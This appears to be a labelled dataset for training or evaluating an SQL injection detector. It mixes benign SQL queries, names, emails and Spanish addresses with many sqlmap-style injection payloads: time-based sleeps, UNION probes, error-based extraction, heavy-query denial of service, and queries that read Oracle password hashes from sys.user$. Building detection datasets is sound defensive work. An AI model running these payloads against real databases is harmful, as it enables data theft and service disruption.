select top 50 percent * from flame select * from shot fetch first 50 percent rows onlyselect top 3 * from gun,0,0,0.0
1'+  (  select 'ymgm' where 8204  =  8204 and sleep  (  5  )  #,1,1,1.0
 update becoming set space = 'present'where orange = 'depend',0,0,0.0
select enemy ( s )  from five select wrong from wind,0,0,0.0
select * from hope fetch first 50 percent rows onlyselect top 3 * from recall,0,0,0.0
"select * from cook where adjective between ""season"" and    ""separate""",0,0,0.0
"1""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,1,1.0
"1'||  (  select 'odud' from dual where 2468  =  2468 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"elt  (  5953  =  5953,1  )  ",1,1,0.98
" select * from choose order by finger, entirely",0,0,0.0
select * from guess where mirror = 'white'  and  ( gentle = 'fought' or headed = 'object' ) ,0,0,0.0
 (  select   (  case when   (  9066  =  5598  )   then 1 else 9066*  (  select 9066 from information_schema.character_sets  )   end   )    ) ,1,1,1.0
select case when 4176  =  6138 then 1 else null end--,1,1,1.0
"-9725  )   where 9068  =  9068 or elt  (  4723  =  1426,1426  )  --",1,1,1.0
"  select child as seen, nobody as [needs]  from make",0,0,0.0
select * from whether where ruler = 'trouble' fetch first 3 rows only,0,0,0.0
2.30158e+15,0,0,0.0
carlin,0,0,0.004468253314358248
select top 50 percent * from flight select * from notice fetch first 50 percent rows onlyselect top 3 * from wild,0,0,0.0
1'  )   where 7252  =  7252,1,1,1.0
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1,1,1.0
5.65818e+15,0,0,0.0
7.05e+15,0,0,0.0
"1   )    )    as myyh where 5116  =  5116 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,1.0
select * from had where keep = 'claws',0,0,0.0
-5258  )   or   (  8459  =  8459  )  *4906,1,1,1.0
"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,1.0
select * from shirt where recognize like '%cover%',0,0,0.0
61tico,0,0,0.004468253314358248
"  select roof,glass,tomorrow from he left join orders on plates.familiarid =  life.ate order by enter.composed",0,0,0.0
"   select here,increase,be,ahead,silly     (  (  without join physical on camp.never =  fog.kept )   inner join tenton orders.gray =  union.cageid ) ",0,0,0.08
"1  )   where 1559  =  1559 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,1,1.0
2.58973e+15,0,0,0.0
create user name identified by pass123 temporary tablespace temp default tablespace users;,1,0,0.43013923481265154
select * from move where religious = 'lost' fetch first 3 rows only,0,0,0.0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'tpih'  =  'tpih",1,1,1.0
49626,0,0,0.004468253314358248
nadav6,0,0,0.004468253314358248
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",1,1,1.0
||6,1,0,0.12
amber,0,0,0.004468253314358248
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'lajk'  =  'lajk,1,1,1.0
delete from page,0,0,0.0
"-9672%""   )    )     )   order by 1#",1,1,1.0
modigh,0,0,0.004468253314358248
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",1,1,0.99
puntallana,0,0,0.004468253314358248
" select * from users where id  =  1 +$ . union select null,@@version -- 1",1,1,1.0
"-7323%"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""%""  =  """,1,1,1.0
"  select soundid as id, situation as common from watch",0,0,0.0
"1%""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""%""  =  """,1,1,1.0
"-4970'  )   union all select 4625,4625,4625,4625,4625,4625,4625,4625#",1,1,1.0
del cid labastie,0,0,0.0
ga27393,0,0,0.004468253314358248
roni,0,0,0.004468253314358248
" select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,1.0
"   select setting, planned+ ', ' + movement+ ' ' + string+ ', ' + solid as suggest  from stove",0,0,0.0
select * from behavior where oxygen = 'saw' fetch first 3 rows only,0,0,0.0
select avg ( drink ) from century,0,0,0.0
select therefore ( s )  from weak select pleasant from radio,0,0,0.0
"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",1,1,1.0
@variable,1,0,0.004468253314358248
"1   )    )    as oqfr where 6426  =  6426 and make_set  (  8403  =  8403,8899  )  --",1,1,1.0
"1%"" union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
"select * from generate_series  (  3551,3551,case when   (  3551  =  6451  )   then 1 else 0 end  )   limit 1--",1,1,1.0
" select * from users where id  =  '1' union select   (  \.  )  ,@@version -- 1'",1,1,1.0
" select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",1,1,1.0
select * from such where from = 'wife',0,0,0.0
nedra,0,0,0.004468253314358248
1em5le28r,0,0,0.004468253314358248
dyck,0,0,0.004468253314358248
"c/ el breton, 187",0,0,0.0
select * from while where am in  ( select stove from instance ) ,0,0,0.0
18505219v,0,0,0.004468253314358248
"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'dfxd' like 'dfxd",1,1,1.0
"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 239189 )  order by meta_id asc",0,0,0.0
"calle puebla de los infantes, 145",0,0,0.0
select avg ( shelf ) from sister,0,0,0.0
"1 where 2363  =  2363 union all select null,null,null,null,null--",1,1,1.0
"1' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,1,1.0
select * from entire where rather between '1996-07-01' and '1996-07-31',0,0,0.0
"  select * from struck where separate in  ( 'never', 'tool', 'planning' )  ",0,0,0.0
"-1868   )    )    union all select 1859,1859--",1,1,1.0
"1""   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""tkkg""  =  ""tkkg",1,1,1.0
select alike ( s )  from life union all,0,0,0.0
sonoe,0,0,0.004468253314358248
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,1,1,1.0
"1'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  'rgue' like 'rgue",1,1,1.0
"1""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""llgb"" like ""llgb",1,1,1.0
"  select orders.enginerid, employees.necessary, employees.mountain from ordersright join employees on orders.employeeid  =  employees.cameid order by orders.everyoneid",0,0,0.0
"1""  )   where 2473  =  2473 and make_set  (  6118  =  7684,7684  )  --",1,1,1.0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'cwuy'  =  'cwuy",1,1,1.0
"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",1,1,1.0
select * from income where chapter = 'distant'  and city = 'pleasant',0,0,0.0
1'  )   where 8128  =  8128,1,1,1.0
select * from good,0,0,0.0
42855301e,0,0,0.004468253314358248
"select customername, contactname from customers where  country  =  ""brazil"";",0,0,0.01
select * from salt where not stage = 'examine'  and not day = 'alphabet',0,0,0.0
select * from dish where west in  ( select army from laugh ) ,0,0,0.0
46824,0,0,0.004468253314358248
select * from speed where not wagon = 'throw'  and not distance = 'depth',0,0,0.0
"   select busy, heard+ ', ' + interior+ ' ' + history+ ', ' + usually as own  from team",0,0,0.0
bendixsen9@foreignoffice.ps,0,0,0.004468253314358248
select top 50 percent * from loose,0,0,0.0
"1 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
delete from electric where remarkable = 'drew',0,0,0.0
select camp ( s )  from chose union,0,0,0.0
carmia,0,0,0.004468253314358248
 update quick set planning = 'under'where another = 'of',0,0,0.0
scavran@eonon.com.at,0,0,0.0
ticona,0,0,0.004468253314358248
"1%""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,1,1,1.0
1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --,1,1,0.85
"pasaje santo angel, 190,",0,0,0.004468253314358248
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lvck'  =  'lvck",1,1,1.0
"-5386'  )   union all select 8026,8026,8026,8026,8026,8026#",1,1,1.0
"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",1,1,1.0
select * from popular where broke = 'thou' fetch first 3 rows only,0,0,0.0
alienacin,0,0,0.004468253314358248
"   select pond, heading+ ', ' + army+ ' ' + wealth+ ', ' + particles as star  from using",0,0,0.0
select * from  ( select motion from wolf ) ,0,0,0.0
soeltoft@nanogenerador.pr,0,0,0.004468253314358248
"  select quarter ( ""2017-06-15"" ) ;",0,0,0.0
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'nlfl' like 'nlfl",1,1,1.0
"1   )    )    as xutu where 5811  =  5811 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
1  )   where 2307  =  2307,1,1,1.0
"-8312%""   )    )    union all select 4972--",1,1,0.99
1   )    )    as efjb where 4642  =  4642 order by 1#,1,1,1.0
select * from gravity,0,0,0.0
select * from camp fetch first 50 percent rows only,0,0,0.0
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""text"" like ""text",1,1,1.0
1'  )   where 2120  =  2120,1,1,1.0
37311,0,0,0.004468253314358248
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1,1,0.99
"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
"-8919"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""nstr""  =  ""nstr",1,1,1.0
"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bkcs'  =  'bkcs",1,1,1.0
siomara,0,0,0.004468253314358248
1  )   as xwgf where 4204  =  4204 and sleep  (  5  )  --,1,1,1.0
select   (  case when   (  4568  =  4241  )   then 4568 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,1.0
select * from made where who = 'private'  or driven = 'upper',0,0,0.0
"1'  )   as qaec where 6572  =  6572 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
2.23935e+15,0,0,0.0
select   (  case when   (  3140  =  4625  )   then 1 else 3140*  (  select 3140 from master..sysdatabases  )   end  )  --,1,1,1.0
"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",1,1,1.0
"1   )    )    union all select null,null,null,null,null,null,null--",1,1,1.0
salvi figuls,0,0,0.004468253314358248
"   select employees.blew, count ( orders.sentid )  as paperfrom    ( ordersinner join man on orders.girlid  =  employees.cowid ) ",0,0,0.0
"iif  (  3548  =  8646,1,1/0  )  ",1,1,1.0
reis,0,0,0.004468253314358248
"-5928""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""rggt"" like ""rggt",1,1,1.0
select count ( headed ) from seven,0,0,0.0
select avg ( thread )  from money  select sum ( name ) ,0,0,0.0
laguna del marquesado,0,0,0.0
select option_value from wp_options where option_name  =  '_houzez_property_status_3088' limit 1,0,0,0.0
1%'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',1,1,1.0
-4484'   )    )    or 6872  =  6872 and    (    (   'oxuo'  =  'oxuo,1,1,1.0
enumer24,0,0,0.004468253314358248
"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,1,1.0
select ln ( 2 ) ;,0,0,0.0
5.22e+15,0,0,0.0
select * from cause fetch first 50 percent rows only,0,0,0.0
"c/ costa verde, 100 4c",0,0,0.0
"-5731"" union all select 3083,3083,3083#",1,1,1.0
"-1907""   )    )    or 2782  =  3591",1,1,1.0
select announced ( s )  from terrible left join,0,0,0.0
select * from  ( select powerful from everyone ) ,0,0,0.0
1%'   )    )     )   and 4595  =  4595#,1,1,0.9900507936507936
"-8364'  )   union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",1,1,1.0
"  select * from game where tie not in  ( 'glad', 'dig', 'largest' )  ",0,0,0.0
select count ( because ) from exact,0,0,0.0
"  update sold set merely =  'apple', city =  'sky' where finest =  quietly",0,0,0.0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual-- vykx",1,1,0.98
"c/ la paloma, 32 12-a",0,0,0.0
"  select dug,pole from art where using = 'lying' union select total, thrown from friendly",0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 193 )  order by meta_id asc",0,0,0.0
1'||  (  select 'kuxp' where 7123  =  7123 and 1688  =  4200#,1,1,1.0
select * from post where soil between '1996-07-01' and '1996-07-31',0,0,0.0
"-4408""  )   or 6872  =  6872 and   (  ""oenu""  =  ""oenu",1,1,1.0
"1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '",1,1,1.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh'  =  'vhvh",1,1,1.0
ã½ or 1  =  1 --,1,1,1.0
"1""   )    )    as qvyu where 5962  =  5962 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,1,1.0
-8292%'  )   or 8571  =  8571--,1,1,1.0
"-2230%"" union all select 3303,3303,3303--",1,1,1.0
" select * from users where id  =  '1' +   (  \.  )   union select 1,@@version -- 1'",1,1,1.0
select * from shut where five = 'combine'  or wore = 'put',0,0,0.0
"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,1,1.0
"  select arrive as mass, both as [lose]  from bad",0,0,0.0
weinberger@privatebanking.com.nz,0,0,0.0
"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",1,1,1.0
select top 3 * from could select * from pressure 3select * from seen,0,0,0.0
gelis,0,0,0.004468253314358248
1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--,1,1,0.99
"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",1,1,1.0
"1"" where 3933  =  3933 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,1,1.0
"1'  )   where 3476  =  3476 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,1,1.0
ad5ma.sc9r,0,0,0.004468253314358248
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  password  )   from   (  select distinct  (  password  )  , rownum as limit from sys.user$  )   where limit  =  3   )    )    and 'i'  =  'i",1,1,1.0
"1%'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  '%'  =  '",1,1,1.0
"   select count ( religious ) , team from go by canal",0,0,0.0
 and 1  =  utl_inaddr.get_host_address   (    (   select count  (  distinct  (  username   )    )    from sys.all_users   )    )    and 'i'  =  'i,1,1,1.0
delete from tight,0,0,0.0
select min ( according )  as brain from eager,0,0,0.0
"1%""   )    )    union all select null,null,null,null,null,null,null--",1,1,1.0
select additional ( s )  from depend union,0,0,0.0
select top 3 * from worth where feathers = 'rubbed',0,0,0.0
from  ( select distinct old from cook ) ,0,0,0.0
tromba,0,0,0.004468253314358248
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",1,1,1.0
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'qgrt'  =  'qgrt",1,1,1.0
 update visit set differ = 'wash'where drive = 'goes',0,0,0.0
"1'  )   as lrif where 6525  =  6525 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",1,1,1.0
1%',1,1,0.7650480267279182
"  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  9339  =  9339  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",1,1,1.0
select * from tongue where cook = 'idea' limit 3,0,0,0.0
select * from worse where carefully  between 10 and 20,0,0,0.0
1 where 5311  =  5311 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,1.0
select * from least 3 select * from love,0,0,0.0
"1%"" union all select null,null,null,null,null#",1,1,1.0
"1"" where 7015  =  7015",1,1,1.0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nimx'  =  'nimx",1,1,1.0
select top 3 * from each select * from oil 3select * from behind,0,0,0.0
alfonso,0,0,0.004468253314358248
select * from floor fetch first 50 percent rows only,0,0,0.0
-8966%' or   (  7475  =  4014  )  *4014 and '%'  =  ',1,1,1.0
64633352v,0,0,0.004468253314358248
"  select faster,cross,eventually from enter left join orders on accurate.plateid =  job.found order by baby.period",0,0,0.0
"1   )    )    union all select null,null,null,null--",1,1,1.0
"calle tarragona, 185 11g",0,0,0.0
lauze,0,0,0.004468253314358248
select * from satellites where studied = 'but'  or syllable = 'film',0,0,0.0
select * from distant where silent not like 'many%',0,0,0.0
1'  )   and   (  2763  =  4004  )  *4004 and   (  'dtts'  =  'dtts,1,1,1.0
bosch linares,0,0,0.004468253314358248
edmunds.emil@carimartin.io,0,0,0.004468253314358248
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,1.0
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,1,1,1.0
3.89139e+15,0,0,0.0
 update in set sound = 'line'where hardly = 'whale',0,0,0.01
select   (  case when   (  5796  =  8326  )   then 5796 else 5796*  (  select 5796 from information_schema.character_sets  )   end  )  #,1,1,1.0
select * from plenty fetch first 50 percent rows only,0,0,0.0
zahn,0,0,0.004468253314358248
gusta mont,0,0,0.004468253314358248
"1""   )    )    as yuqr where 7226  =  7226 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,1,1.0
prdica,0,0,0.004468253314358248
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  password  )   from   (  select distinct  (  password  )  , rownum as limit from sys.user$  )   where limit  =  1   )    )    and 'i'  =  'i",1,1,1.0
schauer,0,0,0.004468253314358248
48748000y,0,0,0.004468253314358248
select * from clay where usual in  ( select circle from various ) ,0,0,0.0
select * from nearer where may = 'pleasant'  and city = 'told',0,0,0.0
select * from club fetch first 50 percent rows onlyselect top 3 * from rocket,0,0,0.0
select min ( that )  as declared from future,0,0,0.0
"-7248""  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""qgms""  =  ""qgms",1,1,1.0
"-9440"" union all select 5599,5599,5599,5599,5599--",1,1,1.0
select count ( lady ) from least,0,0,0.0
"   select employees.number, count ( orders.dailyid )  as incomefrom    ( ordersinner join purple on orders.dependid  =  employees.passageid ) ",0,0,0.0
select * from football where shaking = 'sport'  or clothing = 'oil',0,0,0.0
1'||  (  select 'owzs' where 1475  =  1475 union all select null--,1,1,1.0
"-2722""  )   or 4907  =  8126#",1,1,1.0
select * from feet where hearing not like '[ought]%',0,0,0.0
from  ( select distinct butter from class ) ,0,0,0.0
"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",1,1,1.0
"  select softlyid as id, understanding as discussion from type",0,0,0.0
select avg ( hidden ) from too select sum ( thumb ) ,0,0,0.0
"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",1,1,1.0
select * from pocket where railroad like '%lungs%',0,0,0.0
"   select automobile,balance,younger,substance,blank     (  (  material join leader on president.clock =  strike.captured )   inner join olderon orders.horn =  meal.graphid ) ",0,0,0.0
"1',  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1,0.99
"1   )    )    as wufr where 5239  =  5239 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
3023,0,0,0.004468253314358248
1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,1,1,1.0
select * from pen where not curious = 'vessels'  and not willing = 'thought',0,0,0.0
" select * from eat order by copper, dot",0,0,0.0
1'  )   and   (  3020  =  3020  )  *6703 and   (  'rskq'  =  'rskq,1,1,1.0
9.84215e+15,0,0,0.0
select * from value where off = 'hard' limit 3,0,0,0.0
1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,1,1,1.0
handal hach,0,0,0.004468253314358248
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,1,1.0
"   select sweet, went, carefully from difficulty where wonderful  is null",0,0,0.0
 update rubber set instead = 'brain'where spite = 'coach',0,0,0.0
-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,1,1,1.0
"  select orders.experimentrid, employees.why, employees.biggest from ordersright join employees on orders.employeeid  =  employees.describeid order by orders.instrumentid",0,0,0.0
3.45448e+15,0,0,0.0
analfabetismo,0,0,0.004468253314358248
6.83781e+15,0,0,0.0
delsa,0,0,0.004468253314358248
brihuega,0,0,0.004468253314358248
select * from nothing fetch first 50 percent rows onlyselect top 3 * from club,0,0,0.0
select top 3 * from customers where country = 'germany';,0,0,0.01
lahnstein agundis,0,0,0.004468253314358248
39sch6nz6da,0,0,0.004468253314358248
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""xxug""  =  ""xxug",1,1,1.0
clever,0,0,0.004468253314358248
"   select lovely, section, not from thou where amount  is null",0,0,0.0
delete from shallow where develop = 'listen',0,0,0.0
"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,1,1.0
select * from rather where date = 'passage'  or physical = 'jet',0,0,0.0
select * from tank where house = 'secret' limit 3,0,0,0.0
00207473j,0,0,0.004468253314358248
"insert into with ( leaf, trip, today, life, view, afraid )  values  ( 'been', 'round'. suit', 'replied', 'year', 'help', 'save' )  ",0,0,0.0
select distinct lay from paid,0,0,0.0
select * from alike where sudden = 'immediately',0,0,0.0
select * from progress where pilot = 'chain'  and  ( mountain = 'involved' or meal = 'went' ) ,0,0,0.0
select * from chief where morning like '%force%',0,0,0.0
esplendoroso,0,0,0.004468253314358248
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",1,1,1.0
"1 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,1,0.99
"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'rpof' like 'rpof",1,1,1.0
"1  )   as qzif where 7877  =  7877 union all select null,null,null,null,null,null,null--",1,1,1.0
massa@noviasteresapalacios.mg,0,0,0.004468253314358248
alcarrs,0,0,0.004468253314358248
select disappear ( s )  from fighting union all,0,0,0.0
select count ( sail )  from traffic,0,0,0.0
select distinct belt from class,0,0,0.0
16118,0,0,0.004468253314358248
"-5925  )   where 5758  =  5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1,1,1.0
select option_value from wp_options where option_name  =  'classic-editor-allow-users' limit 1,0,0,0.09
1'  )   where 8204  =  8204,1,1,1.0
registro,0,0,0.004468253314358248
"1""   )    )    as oxrr where 6141  =  6141 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
onofre,0,0,0.004468253314358248
select capital ( s from probably right join,0,0,0.0
"calle salvador de madariaga s/n,",0,0,0.0
4.24505e+15,0,0,0.0
"iif  (  9190  =  5059,1,1/0  )  ",1,1,1.0
"-4379' union all select 1648,1648,1648,1648,1648,1648,1648#",1,1,1.0
13791863m,0,0,0.004468253314358248
1.89443e+15,0,0,0.0
kenta1,0,0,0.004468253314358248
"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",1,1,1.0
mari cielo,0,0,0.004468253314358248
"select * from baseball where elephant between ""suppose"" and    ""gas""",0,0,0.0
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'hhbh'  =  'hhbh",1,1,1.0
11901410z,0,0,0.004468253314358248
"1'  )   where 8586  =  8586 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
1'||  (  select 'glec' from dual where 4846  =  4846,1,1,1.0
